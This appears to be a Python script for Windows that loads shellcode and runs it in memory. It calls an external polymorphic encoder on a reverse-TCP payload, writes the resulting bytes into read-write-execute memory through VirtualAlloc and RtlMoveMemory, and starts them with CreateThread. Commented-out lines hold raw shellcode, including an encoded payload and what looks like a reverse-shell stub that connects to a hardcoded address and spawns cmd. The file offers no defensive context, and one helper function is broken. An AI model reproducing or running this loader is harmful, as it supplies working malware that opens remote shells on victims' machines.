import ctypes
import subprocess

# shellcode = b"hed \x0b\x814$\x01\x01\x01\x01H\xb8 shellcoPH\xb8rld fromPH\xb8Hello WoPj\x01Xj\x01_j\x1cZH\x89\xe6\x0f\x05XXXX\xc3"
# shellcode = subprocess.Popen(["cmd", "/C", "polymshell.exe ./reversetcp.bin"], stdout=subprocess.PIPE).communicate()[0]
# shellcode = subprocess.check_output(["cmd", "/C", "polymshell.exe ./reversetcp.bin"])
# print("P1:")
# print(shellcode)
# shellcode = bytearray(shellcode)
# while(shellcode == "N"):
#     shellcode = str(subprocess.Popen(["cmd", "/C", "polymshell.exe ./reversetcp.bin"], stdout=subprocess.PIPE).communicate()[0])

# shellcode = bytes.fromhex(shellcode)
# shellcode = bytearray(shellcode)
# print("P2:")
# print("%02X" % shellcode)
# print(shellcode)

import struct

def shellc2bytes(string):
    bytes = b''
    for i in string:
        # bytes += struct.pack("B", ord(i))
        bytes += ord(i)
    return bytes     

def get_shellcode():
    # sbytes = bytes()
    # shellcodestr = '\x4d\x31\xc0\x41\xb1\xf3\xeb\x1a\x58\x48\x31\xc9\x48\x31\xdb\x8a\x1c\x08\x4c\x39\xc3\x74\x10\x44\x30\xcb\x88\x1c\x08\x48\xff\xc1\xeb\xed\xe8\xe1\xff\xff\xff\x0f\xbb\x70\x17\x03\x1b\x33\xf3\xf3\xf3\xb2\xa2\xb2\xa3\xa1\xa2\xa5\xbb\xc2\x21\x96\xbb\x78\xa1\x93\xbb\x78\xa1\xeb\xbb\x78\xa1\xd3\xbb\x78\x81\xa3\xbb\xfc\x44\xb9\xb9\xbe\xc2\x3a\xbb\xc2\x33\x5f\xcf\x92\x8f\xf1\xdf\xd3\xb2\x32\x3a\xfe\xb2\xf2\x32\x11\x1e\xa1\xb2\xa2\xbb\x78\xa1\xd3\x78\xb1\xcf\xbb\xf2\x23\x78\x73\x7b\xf3\xf3\xf3\xbb\x76\x33\x87\x94\xbb\xf2\x23\xa3\x78\xbb\xeb\xb7\x78\xb3\xd3\xba\xf2\x23\x10\xa5\xbb\x0c\x3a\xb2\x78\xc7\x7b\xbb\xf2\x25\xbe\xc2\x3a\xbb\xc2\x33\x5f\xb2\x32\x3a\xfe\xb2\xf2\x32\xcb\x13\x86\x02\xbf\xf0\xbf\xd7\xfb\xb6\xca\x22\x86\x2b\xab\xb7\x78\xb3\xd7\xba\xf2\x23\x95\xb2\x78\xff\xbb\xb7\x78\xb3\xef\xba\xf2\x23\xb2\x78\xf7\x7b\xbb\xf2\x23\xb2\xab\xb2\xab\xad\xaa\xa9\xb2\xab\xb2\xaa\xb2\xa9\xbb\x70\x1f\xd3\xb2\xa1\x0c\x13\xab\xb2\xaa\xa9\xbb\x78\xe1\x1a\xa4\x0c\x0c\x0c\xae\xba\x4d\x84\x80\xc1\xac\xc0\xc1\xf3\xf3\xb2\xa5\xba\x7a\x15\xbb\x72\x1f\x53\xf2\xf3\xf3\xba\x7a\x16\xba\x4f\xf1\xf3\xe0\x78\xf9\xf3\xf1\xf6\xb2\xa7\xba\x7a\x17\xbf\x7a\x02\xb2\x49\xbf\x84\xd5\xf4\x0c\x26\xbf\x7a\x19\x9b\xf2\xf2\xf3\xf3\xaa\xb2\x49\xda\x73\x98\xf3\x0c\x26\xa3\xa3\xbe\xc2\x3a\xbe\xc2\x33\xbb\x0c\x33\xbb\x7a\x31\xbb\x0c\x33\xbb\x7a\x32\xb2\x49\x19\xfc\x2c\x13\x0c\x26\xbb\x7a\x34\x99\xe3\xb2\xab\xbf\x7a\x11\xbb\x7a\x0a\xb2\x49\x6a\x56\x87\x92\x0c\x26\xbb\x72\x37\xb3\xf1\xf3\xf3\xba\x4b\x90\x9e\x97\xf3\xf3\xf3\xf3\xf3\xb2\xa3\xb2\xa3\xbb\x7a\x11\xa4\xa4\xa4\xbe\xc2\x33\x99\xfe\xaa\xb2\xa3\x11\x0f\x95\x34\xb7\xd7\xa7\xf2\xf2\xbb\x7e\xb7\xd7\xeb\x35\xf3\x9b\xbb\x7a\x15\xa5\xa3\xb2\xa3\xb2\xa3\xb2\xa3\xba\x0c\x33\xb2\xa3\xba\x0c\x3b\xbe\x7a\x32\xbf\x7a\x32\xb2\x49\x8a\x3f\xcc\x75\x0c\x26\xbb\xc2\x21\xbb\x0c\x39\x78\xfd\xb2\x49\xfb\x74\xee\x93\x0c\x26\x48\x03\x46\x51\xa5\xb2\x49\x55\x66\x4e\x6e\x0c\x26\xbb\x70\x37\xdb\xcf\xf5\x8f\xf9\x73\x08\x13\x86\xf6\x48\xb4\xe0\x81\x9c\x99\xf3\xaa\xb2\x7a\x29\x0c\x26'
    shellcodestr = subprocess.check_output(["cmd", "/C", "polymshell.exe ./reversetcp.bin"], text=True)
    shellcodestr = shellcodestr.replace('\\x', ' ')
    # shellcode = subprocess.Popen(["cmd", "/C", "polymshell.exe ./reversetcp.bin"], stdout=subprocess.PIPE).communicate()[0]
    print("Popen:")
    print(shellcodestr)
    # sbytes = bytes(shellcode, 'utf-8')
    # shellcode = shellcodestr.encode('utf-8')
    # print("P1:")
    # print(shellcode)
    # shellcode = shellc2bytes(shellcode)
    # print("P1:")
    # print(sbytes)
    
    return bytearray(bytes.fromhex(shellcodestr))
    # return shellcode

# b'\xdb\xc3\xd9\x74\x24\xf4\xbe\xe8\x5a\x27\x13\x5f\x31\xc9\xb1\x33\x31\x77\x17\x83\xc7\x04\x03\x9f\x49\xc5\xe6\xa3\x86\x80\x09\x5b\x57\xf3\x80\xbe\x66\x21\xf6\xcb\xdb\xf5\x7c\x99\xd7\x7e\xd0\x09\x63\xf2\xfd\x3e\xc4\xb9\xdb\x71\xd5\x0f\xe4\xdd\x15\x11\x98\x1f\x4a\xf1\xa1\xd0\x9f\xf0\xe6\x0c\x6f\xa0\xbf\x5b\xc2\x55\xcb\x19\xdf\x54\x1b\x16\x5f\x2f\x1e\xe8\x14\x85\x21\x38\x84\x92\x6a\xa0\xae\xfd\x4a\xd1\x63\x1e\xb6\x98\x08\xd5\x4c\x1b\xd9\x27\xac\x2a\x25\xeb\x93\x83\xa8\xf5\xd4\x23\x53\x80\x2e\x50\xee\x93\xf4\x2b\x34\x11\xe9\x8b\xbf\x81\xc9\x2a\x13\x57\x99\x20\xd8\x13\xc5\x24\xdf\xf0\x7d\x50\x54\xf7\x51\xd1\x2e\xdc\x75\xba\xf5\x7d\x2f\x66\x5b\x81\x2f\xce\x04\x27\x3b\xfc\x51\x51\x66\x6a\xa7\xd3\x1c\xd3\xa7\xeb\x1e\x73\xc0\xda\x95\x1c\x97\xe2\x7f\x59\x67\xa9\x22\xcb\xe0\x74\xb7\x4e\x6d\x87\x6d\x8c\x88\x04\x84\x6c\x6f\x14\xed\x69\x2b\x92\x1d\x03\x24\x77\x22\xb0\x45\x52\x41\x57\xd6\x3e\xa8\xf2\x5e\xa4\xb4'
    # return bytearray(b'\x4d\x31\xc0\x41\xb1\xf3\xeb\x1a\x58\x48\x31\xc9\x48\x31\xdb\x8a\x1c\x08\x4c\x39\xc3\x74\x10\x44\x30\xcb\x88\x1c\x08\x48\xff\xc1\xeb\xed\xe8\xe1\xff\xff\xff\x0f\xbb\x70\x17\x03\x1b\x33\xf3\xf3\xf3\xb2\xa2\xb2\xa3\xa1\xa2\xa5\xbb\xc2\x21\x96\xbb\x78\xa1\x93\xbb\x78\xa1\xeb\xbb\x78\xa1\xd3\xbb\x78\x81\xa3\xbb\xfc\x44\xb9\xb9\xbe\xc2\x3a\xbb\xc2\x33\x5f\xcf\x92\x8f\xf1\xdf\xd3\xb2\x32\x3a\xfe\xb2\xf2\x32\x11\x1e\xa1\xb2\xa2\xbb\x78\xa1\xd3\x78\xb1\xcf\xbb\xf2\x23\x78\x73\x7b\xf3\xf3\xf3\xbb\x76\x33\x87\x94\xbb\xf2\x23\xa3\x78\xbb\xeb\xb7\x78\xb3\xd3\xba\xf2\x23\x10\xa5\xbb\x0c\x3a\xb2\x78\xc7\x7b\xbb\xf2\x25\xbe\xc2\x3a\xbb\xc2\x33\x5f\xb2\x32\x3a\xfe\xb2\xf2\x32\xcb\x13\x86\x02\xbf\xf0\xbf\xd7\xfb\xb6\xca\x22\x86\x2b\xab\xb7\x78\xb3\xd7\xba\xf2\x23\x95\xb2\x78\xff\xbb\xb7\x78\xb3\xef\xba\xf2\x23\xb2\x78\xf7\x7b\xbb\xf2\x23\xb2\xab\xb2\xab\xad\xaa\xa9\xb2\xab\xb2\xaa\xb2\xa9\xbb\x70\x1f\xd3\xb2\xa1\x0c\x13\xab\xb2\xaa\xa9\xbb\x78\xe1\x1a\xa4\x0c\x0c\x0c\xae\xba\x4d\x84\x80\xc1\xac\xc0\xc1\xf3\xf3\xb2\xa5\xba\x7a\x15\xbb\x72\x1f\x53\xf2\xf3\xf3\xba\x7a\x16\xba\x4f\xf1\xf3\xe0\x78\xf9\xf3\xf1\xf6\xb2\xa7\xba\x7a\x17\xbf\x7a\x02\xb2\x49\xbf\x84\xd5\xf4\x0c\x26\xbf\x7a\x19\x9b\xf2\xf2\xf3\xf3\xaa\xb2\x49\xda\x73\x98\xf3\x0c\x26\xa3\xa3\xbe\xc2\x3a\xbe\xc2\x33\xbb\x0c\x33\xbb\x7a\x31\xbb\x0c\x33\xbb\x7a\x32\xb2\x49\x19\xfc\x2c\x13\x0c\x26\xbb\x7a\x34\x99\xe3\xb2\xab\xbf\x7a\x11\xbb\x7a\x0a\xb2\x49\x6a\x56\x87\x92\x0c\x26\xbb\x72\x37\xb3\xf1\xf3\xf3\xba\x4b\x90\x9e\x97\xf3\xf3\xf3\xf3\xf3\xb2\xa3\xb2\xa3\xbb\x7a\x11\xa4\xa4\xa4\xbe\xc2\x33\x99\xfe\xaa\xb2\xa3\x11\x0f\x95\x34\xb7\xd7\xa7\xf2\xf2\xbb\x7e\xb7\xd7\xeb\x35\xf3\x9b\xbb\x7a\x15\xa5\xa3\xb2\xa3\xb2\xa3\xb2\xa3\xba\x0c\x33\xb2\xa3\xba\x0c\x3b\xbe\x7a\x32\xbf\x7a\x32\xb2\x49\x8a\x3f\xcc\x75\x0c\x26\xbb\xc2\x21\xbb\x0c\x39\x78\xfd\xb2\x49\xfb\x74\xee\x93\x0c\x26\x48\x03\x46\x51\xa5\xb2\x49\x55\x66\x4e\x6e\x0c\x26\xbb\x70\x37\xdb\xcf\xf5\x8f\xf9\x73\x08\x13\x86\xf6\x48\xb4\xe0\x81\x9c\x99\xf3\xaa\xb2\x7a\x29\x0c\x26')
#  return bytearray(b'\xFC\x48\x83\xE4\xF0\xE8\xC0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xD2\x65\x48\x8B\x52\x60\x48\x8B\x52\x18\x48\x8B\x52\x20\x48\x8B\x72\x50\x48\x0F\xB7\x4A\x4A\x4D\x31\xC9\x48\x31\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\x41\xC1\xC9\x0D\x41\x01\xC1\xE2\xED\x52\x41\x51\x48\x8B\x52\x20\x8B\x42\x3C\x48\x01\xD0\x8B\x80\x88\x00\x00\x00\x48\x85\xC0\x74\x67\x48\x01\xD0\x50\x8B\x48\x18\x44\x8B\x40\x20\x49\x01\xD0\xE3\x56\x48\xFF\xC9\x41\x8B\x34\x88\x48\x01\xD6\x4D\x31\xC9\x48\x31\xC0\xAC\x41\xC1\xC9\x0D\x41\x01\xC1\x38\xE0\x75\xF1\x4C\x03\x4C\x24\x08\x45\x39\xD1\x75\xD8\x58\x44\x8B\x40\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48\x44\x8B\x40\x1C\x49\x01\xD0\x41\x8B\x04\x88\x48\x01\xD0\x41\x58\x41\x58\x5E\x59\x5A\x41\x58\x41\x59\x41\x5A\x48\x83\xEC\x20\x41\x52\xFF\xE0\x58\x41\x59\x5A\x48\x8B\x12\xE9\x57\xFF\xFF\xFF\x5D\x49\xBE\x77\x73\x32\x5F\x33\x32\x00\x00\x41\x56\x49\x89\xE6\x48\x81\xEC\xA0\x01\x00\x00\x49\x89\xE5\x49\xBC\x02\x00\x13\x8B\x0A\x00\x02\x05\x41\x54\x49\x89\xE4\x4C\x89\xF1\x41\xBA\x4C\x77\x26\x07\xFF\xD5\x4C\x89\xEA\x68\x01\x01\x00\x00\x59\x41\xBA\x29\x80\x6B\x00\xFF\xD5\x50\x50\x4D\x31\xC9\x4D\x31\xC0\x48\xFF\xC0\x48\x89\xC2\x48\xFF\xC0\x48\x89\xC1\x41\xBA\xEA\x0F\xDF\xE0\xFF\xD5\x48\x89\xC7\x6A\x10\x41\x58\x4C\x89\xE2\x48\x89\xF9\x41\xBA\x99\xA5\x74\x61\xFF\xD5\x48\x81\xC4\x40\x02\x00\x00\x49\xB8\x63\x6D\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xE2\x57\x57\x57\x4D\x31\xC0\x6A\x0D\x59\x41\x50\xE2\xFC\x66\xC7\x44\x24\x54\x01\x01\x48\x8D\x44\x24\x18\xC6\x00\x68\x48\x89\xE6\x56\x50\x41\x50\x41\x50\x41\x50\x49\xFF\xC0\x41\x50\x49\xFF\xC8\x4D\x89\xC1\x4C\x89\xC1\x41\xBA\x79\xCC\x3F\x86\xFF\xD5\x48\x31\xD2\x48\xFF\xCA\x8B\x0E\x41\xBA\x08\x87\x1D\x60\xFF\xD5\xBB\xF0\xB5\xA2\x56\x41\xBA\xA6\x95\xBD\x9D\xFF\xD5\x48\x83\xC4\x28\x3C\x06\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x59\x41\x89\xDA\xFF\xD5')


def runshell():
    # shellcode = subprocess.check_output(["cmd", "/C", "polymshell.exe ./reversetcp.bin"])
    
    # shellcode = bytearray(shellcode)
    shellcode = get_shellcode()
    print("P2:")
    print(shellcode)
    
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                            ctypes.c_int(len(shellcode)),
                                            ctypes.c_int(0x3000),
                                            ctypes.c_int(0x40))
    
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                        buf,
                                        ctypes.c_int(len(shellcode)))
    
    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                            ctypes.c_int(0),
                                            ctypes.c_int(ptr),
                                            ctypes.c_int(0),
                                            ctypes.c_int(0),
                                            ctypes.pointer(ctypes.c_int(0)))
    
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
    
def runshell_64():
    shellcode = get_shellcode()
    print("P2:")
    print(shellcode)
    
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ctypes.windll.kernel32.RtlCopyMemory.argtypes = ( ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t ) 
    ctypes.windll.kernel32.CreateThread.argtypes = ( ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_int) ) 

    space = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
    buff = ( ctypes.c_char * len(shellcode) ).from_buffer( shellcode )
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(space),buff,ctypes.c_int(len(shellcode)))
    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_void_p(space),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
    
def run_exec():
    subprocess.Popen(["cmd", "/C", "polymshell.exe ./reversetcp.bin"])
    
if __name__ == "__main__":
    runshell()
    